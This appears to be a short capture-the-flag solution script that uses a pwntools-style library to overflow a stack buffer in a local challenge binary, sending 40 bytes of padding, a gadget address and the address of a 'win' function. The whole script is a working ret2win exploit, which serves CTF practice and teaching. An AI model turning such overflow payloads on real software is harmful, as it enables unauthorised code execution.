from ctflib.pwn import *

e = ELF("./chal")
def setup():
    return e.process()
context.binary = e

p = setup()
p.sendline(b"a"*40 + p64(0x00000000004012bf)+p64(e.sym.win))
p.interactive()